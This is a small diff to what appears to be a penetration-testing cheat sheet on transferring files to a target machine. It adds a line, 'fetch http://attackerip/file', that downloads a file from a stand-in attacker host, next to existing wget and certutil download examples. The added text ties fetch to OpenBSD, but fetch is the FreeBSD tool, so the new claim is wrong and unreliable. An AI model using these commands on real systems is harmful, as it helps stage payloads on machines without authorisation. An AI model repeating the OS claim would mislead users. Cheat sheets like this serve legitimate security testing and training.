@@ -250,6 +250,12 @@ Alternatively, download with wget:
 wget http://10.10.10.10 -O filename
 ```
 
+Alternatively, if you're in OpenBSD you can use fetch:
+
+```text
+fetch http://attackerip/file
+```
+
 Alternatively, download with certutil:
 
 ```text
